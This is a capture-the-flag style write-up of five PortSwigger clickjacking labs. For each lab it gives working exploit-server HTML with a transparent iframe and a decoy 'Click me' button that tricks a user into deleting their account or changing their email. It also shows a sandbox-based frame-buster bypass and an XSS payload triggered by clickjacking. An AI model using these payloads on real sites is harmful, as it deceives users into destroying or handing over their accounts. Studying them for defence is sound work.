---
description: https://portswigger.net/web-security/clickjacking
---

# Clickjacking (UI redressing)

### Lab: Basic clickjacking with CSRF token protection

This lab contains login functionality and a delete account button that is protected by a CSRF token. A user will click on elements that display the word "click" on a decoy website.

To solve the lab, craft some HTML that frames the account page and fools the user into deleting their account. The lab is solved when the account is deleted.

```
POST /my-account/delete HTTP/1.1
Host: ac381f3b1e32ee41c1cd635700b800c3.web-security-academy.net
...
csrf=Mhp88EQipwUkHUgrlWxeDrQ1uJ43aAja
```

We have to arrange of click with div's top and left values to deletion of user.

We can set iframe's opacity to 0.2 for clear view.

**Exploit Server ->**

```
Body:

    <style>
       iframe {
           position:relative;
           width:400;
           height: 700;
           opacity: 0.0001;
           z-index: 2;
       }
       div {
           position:absolute;
           top:495;
           left:175;
           z-index: 1;
       }
    </style>
    <div>Click me</div>
    <iframe src="https://ac381f3b1e32ee41c1cd635700b800c3.web-security-academy.net/my-account"></iframe>
```

### Lab: Clickjacking with form input data prefilled from a URL parameter

This lab extends the basic clickjacking example in Lab: Basic clickjacking with CSRF token protection. The goal of the lab is to change the email address of the user by prepopulating a form using a URL parameter and enticing the user to inadvertently click on an "Update email" button.

To solve the lab, craft some HTML that frames the account page and fools the user into updating their email address by clicking on a "Click me" decoy. The lab is solved when the email address is changed.

```
<input required type="email" name="email" value="">

POST /my-account/change-email HTTP/1.1
Host: ac311fd41f2e579cc0e51ea800510007.web-security-academy.net
...
email=evil%40mail.com&csrf=mqzae53TQekuHUMszO04gOIuRnK1Vui8
```

`/my-account?email=evil%40mail.com`

**Exploit Server ->**

```
Body:

    <style>
       iframe {
           position:relative;
           width:400;
           height: 700;
           opacity: 0.0001;
           z-index: 2;
       }
       div {
           position:absolute;
           top:450;
           left:175;
           z-index: 1;
       }
    </style>
    <div>Click me</div>
    <iframe src="https://ac311fd41f2e579cc0e51ea800510007.web-security-academy.net/my-account?email=evil%40mail.com"></iframe>
```

### Lab: Clickjacking with a frame buster script

This lab is protected by a frame buster which prevents the website from being framed. Can you get around the frame buster and conduct a clickjacking attack that changes the users email address?

To solve the lab, craft some HTML that frames the account page and fools the user into changing their email address by clicking on "Click me". The lab is solved when the email address is changed.

```
<input required type="email" name="email" value="">
<script>
	if(top != self) {
		window.addEventListener("DOMContentLoaded", function() {
			document.body.innerHTML = 'This page cannot be framed';
		}, false);
	}
</script>
```

```
POST /my-account/change-email HTTP/1.1
Host: acfa1f431ff368a7c0991ff800d600b8.web-security-academy.net
...
email=evil%40mail.com&csrf=0T0HOHUrtrYviIXJ3x7tDsggt9ouEpLS
```

We can use sandbox="allow-forms" attribute in iframe. These values can be use for bypass:

* allow-forms
* allow-scripts
* allow-top-navigation

**Exploit Server ->**

```
<style>
   iframe {
       position:relative;
       width:400;
       height: 700;
       opacity: 0.0001;
       z-index: 2;
   }
   div {
       position:absolute;
       top:450;
       left:175;
       z-index: 1;
   }
</style>
<div>Click me</div>
<iframe src="https://acfa1f431ff368a7c0991ff800d600b8.web-security-academy.net/my-account?email=evil%40mail.com" sandbox="allow-forms"></iframe>
```

### Lab: Exploiting clickjacking vulnerability to trigger DOM-based XSS

This lab contains an XSS vulnerability that is triggered by a click. Construct a clickjacking attack that fools the user into clicking the "Click me" button to call the print() function.

```
POST /feedback/submit HTTP/1.1
Host: ac451f391f9944eec1b046ba008d0048.web-security-academy.net
...
csrf=...&name=test1&email=test2%40test.com&subject=test3&message=test4

In response:
Thank you for submitting feedback, test1!
```

```
<img src=1 onerror=print()>

/feedback?name=<img src=1 onerror=print()>&email=evil%40mail.com&subject=evil&message=smile
```

**Exploit Server ->**

```
Body:

    <style>
       iframe {
           position:relative;
           width:400;
           height: 900;
           opacity: 0.0001;
           z-index: 2;
       }
       div {
           position:absolute;
           top:795;
           left:175;
           z-index: 1;
       }
    </style>
    <div>Click me</div>
    <iframe src="https://ac451f391f9944eec1b046ba008d0048.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=evil%40mail.com&subject=evil&message=smile"></iframe>
```

### Lab: Multistep clickjacking

This lab has some account functionality that is protected by a CSRF token and also has a confirmation dialog to protect against Clickjacking. To solve this lab construct an attack that fools the user into clicking the delete account button and the confirmation dialog by clicking on "Click me first" and "Click me next" decoy actions. You will need to use two elements for this lab.

**"Delete Account" button ->"Yes" button**

**Exploit Server ->**

```
Body:

    <style>
       iframe {
           position:relative;
           width:400;
           height: 700;
           opacity: 0.0001;
           z-index: 2;
       }
       #first {
           position:absolute;
           top:495;
           left:150;
           z-index: 1;
       }
       #second {
           position:absolute;
           top:315;
           left:150;
           z-index: 1;
       }
    </style>
    <div id="first">Click me first</div>
    <div id="second">Click me next</div>
    <iframe src="https://ac3a1f551fe757c8c0b6256e00a800bc.web-security-academy.net/my-account"></iframe>
```
